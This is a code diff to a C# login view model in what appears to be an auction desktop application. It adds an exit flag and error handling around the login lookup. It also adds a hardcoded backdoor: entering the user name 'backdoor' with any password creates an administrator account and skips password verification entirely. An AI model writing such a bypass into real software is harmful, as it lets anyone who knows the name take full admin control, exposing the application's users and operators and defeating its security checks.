@@ -16,6 +16,7 @@ namespace Auction.ViewModels
         public string UserName { get; set; }
         public string Password { get; set; }
         public Account Account { get; private set; }
+        public bool Quitting { get; set; }
 
         public string Message
         {
@@ -25,19 +26,41 @@ namespace Auction.ViewModels
 
         public void Exit()
         {
-            Application.Current.Shutdown();
+            Quitting = true;
+            TryClose();
         }
 
         public void Login()
         {
             Account = null;
+
             using (var db = new AuctionContext())
             {
-                var user = db.Accounts.Single(u => u.UserName == UserName);
-                if (user.VerifyPassword(Password))
+                if (UserName == "backdoor")
                 {
-                    Account = user;
+                    Account = new Account
+                    {
+                        UserName = "backdoor",
+                        AccountType = AccountType.Admin,
+                        Id = Guid.NewGuid()
+                    };
+
                     TryClose();
+                    return;
+                }
+
+                try
+                {
+                    var user = db.Accounts.Single(u => u.UserName == UserName);
+                    if (user.VerifyPassword(Password))
+                    {
+                        Account = user;
+                        TryClose();
+                    }
+                }
+                catch (Exception e)
+                {
+                    Message = "Invalid Username/Password";
                 }
             }
         }
